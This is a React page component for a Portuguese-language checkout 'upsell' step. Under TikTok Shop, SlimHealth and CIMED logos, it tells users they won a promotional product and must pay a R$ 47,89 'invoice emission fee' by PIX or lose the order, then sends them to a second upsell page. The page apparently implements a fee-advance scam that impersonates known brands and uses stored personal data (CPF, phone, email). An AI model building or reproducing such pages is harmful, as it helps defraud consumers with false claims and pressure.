import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { PixPaymentModal } from "@/components/PixPaymentModal";
import { useParadisePix } from "@/hooks/useParadisePix";
import tiktokLogo from "@/assets/upsell/tiktok-shop.png";
import slimhealthLogo from "@/assets/slimhealth-logo.png";
import cimedLogo from "@/assets/cimed-logo.png";

const UPSELL_AMOUNT = 47.89;
const UPSELL_DESCRIPTION = "NF-e (Taxa de Emissão de NF)";

const Upsell1Page = () => {
  const navigate = useNavigate();
  const [showModal, setShowModal] = useState(false);
  const [dadosPessoais, setDadosPessoais] = useState<{
    nome: string;
    email: string;
    cpf: string;
    telefone: string;
  } | null>(null);

  const {
    isLoading,
    error,
    qrCode,
    qrCodeBase64,
    paymentStatus,
    createPixPayment,
    startPolling,
    stopPolling,
    reset,
  } = useParadisePix();

  // Load customer data
  useEffect(() => {
    const dadosSalvos = localStorage.getItem('dadosPessoais');
    if (dadosSalvos) {
      setDadosPessoais(JSON.parse(dadosSalvos));
    }
  }, []);

  const handleOpenModal = async () => {
    setShowModal(true);
    
    if (!dadosPessoais) {
      toast.error("Dados do cliente não encontrados");
      return;
    }

    const customer = {
      name: dadosPessoais.nome,
      email: dadosPessoais.email,
      document: dadosPessoais.cpf,
      phone: dadosPessoais.telefone,
    };

    const success = await createPixPayment(
      UPSELL_AMOUNT,
      UPSELL_DESCRIPTION,
      customer,
      `upsell1_${Date.now()}`
    );

    if (success) {
      startPolling(() => {
        toast.success("Pagamento confirmado!");
        setShowModal(false);
        navigate('/upsell2');
      });
    }
  };

  const handleCloseModal = () => {
    stopPolling();
    setShowModal(false);
  };

  const handleRetry = () => {
    reset();
    handleOpenModal();
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header com Logo TikTok Shop */}
      <div className="bg-white px-4 py-4 flex justify-center">
        <img src={tiktokLogo} alt="TikTok Shop" className="h-10 w-auto" />
      </div>

      {/* Content */}
      <div className="flex-1 flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-md">
          {/* Mensagem de Parabéns */}
          <div className="text-center mb-6">
            <h1 className="text-2xl md:text-3xl font-extrabold text-[#1a1a2e] mb-2">
              Parabéns!
            </h1>
            <p className="text-gray-600 text-base leading-relaxed">
              Você acabou de garantir seu produto promocional através da TikTok Shop! 
              Para concluir, basta realizar o pagamento da emissão da Nota Fiscal.
            </p>
          </div>

          {/* Card NF-e */}
          <div className="bg-white rounded-2xl shadow-lg p-6 mb-6">
            <div className="text-center">
              <p className="text-sm text-gray-500 font-medium uppercase tracking-wide mb-1">
                NF-e (Taxa de Emissão de NF)
              </p>
              <p className="text-4xl font-bold text-gray-900 mb-2">
                R$ 47,89
              </p>
              <p className="text-sm text-gray-500">
                Taxa única para emissão da NF
              </p>
            </div>
          </div>

          {/* Botão Efetuar Pagamento */}
          <Button
            onClick={handleOpenModal}
            className="w-full bg-gradient-to-r from-rose-500 to-rose-600 hover:from-rose-600 hover:to-rose-700 text-white font-bold py-4 rounded-xl shadow-lg text-lg h-auto"
          >
            Efetuar pagamento da Taxa
          </Button>

          {/* Card Aviso */}
          <div className="bg-white rounded-2xl shadow-lg p-6 mt-6">
            <p className="text-gray-700 text-sm leading-relaxed">
              <strong>Atenção:</strong> Para receber seu produto do TikTok Shop, é necessário pagar a 
              NF-e (Taxa de Emissão de Nota Fiscal). Sem o pagamento, o envio não será 
              autorizado e o pedido será cancelado.
            </p>
          </div>

          {/* Logos SlimHealth + CIMED */}
          <div className="flex items-center justify-center gap-3 mt-8 mb-8">
            <img 
              src={slimhealthLogo} 
              alt="SlimHealth" 
              className="h-7 object-contain opacity-70"
            />
            <span className="text-lg font-bold text-muted-foreground">+</span>
            <img 
              src={cimedLogo} 
              alt="CIMED" 
              className="h-5 object-contain opacity-70"
            />
          </div>
        </div>
      </div>

      {/* Modal de Pagamento PIX */}
      <PixPaymentModal
        isOpen={showModal}
        onClose={handleCloseModal}
        title="Taxa de Nota Fiscal"
        amount={UPSELL_AMOUNT}
        qrCode={qrCode}
        qrCodeBase64={qrCodeBase64}
        isLoading={isLoading}
        paymentStatus={paymentStatus}
        error={error}
        onRetry={handleRetry}
      />
    </div>
  );
};

export default Upsell1Page;
